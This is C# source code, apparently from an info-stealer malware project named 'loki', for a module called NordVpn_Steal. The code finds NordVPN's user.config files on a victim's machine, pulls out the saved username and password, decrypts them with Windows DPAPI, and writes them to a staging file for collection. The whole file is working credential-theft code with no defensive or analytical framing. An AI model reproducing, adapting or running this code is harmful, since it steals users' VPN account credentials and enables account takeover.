using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;

namespace loki.loki.Utilies.App;

public static class NordVpn_Steal
{
	public static void Nord_Vpn_Grabber(string string_0)
	{
		Directory.CreateDirectory(string_0 + "\\Apps\\Vpn");
		using StreamWriter streamWriter = new StreamWriter(string_0 + "\\Apps\\Vpn\\NordVPN\\Account.txt");
		DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "NordVPN"));
		if (!directoryInfo.Exists)
		{
			return;
		}
		DirectoryInfo[] directories = directoryInfo.GetDirectories("NordVpn.exe*");
		for (int i = 0; i < directories.Length; i++)
		{
			DirectoryInfo[] directories2 = directories[i].GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories2)
			{
				streamWriter.WriteLine("\tFound version " + directoryInfo2.Name);
				string text = Path.Combine(directoryInfo2.FullName, "user.config");
				if (File.Exists(text))
				{
					XmlDocument xmlDocument = new XmlDocument();
					xmlDocument.Load(text);
					string innerText = xmlDocument.SelectSingleNode("//setting[@name='Username']/value")!.InnerText;
					string innerText2 = xmlDocument.SelectSingleNode("//setting[@name='Password']/value")!.InnerText;
					if (innerText != null && !string.IsNullOrEmpty(innerText))
					{
						streamWriter.WriteLine("\t\tUsername: " + Nord_Vpn_Decoder(innerText));
					}
					if (innerText2 != null && !string.IsNullOrEmpty(innerText2))
					{
						streamWriter.WriteLine("\t\tPassword: " + Nord_Vpn_Decoder(innerText2));
					}
				}
			}
		}
	}

	public static string Nord_Vpn_Decoder(string s)
	{
		try
		{
			return Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(s), (byte[])null, (DataProtectionScope)1));
		}
		catch
		{
			return "";
		}
	}
}
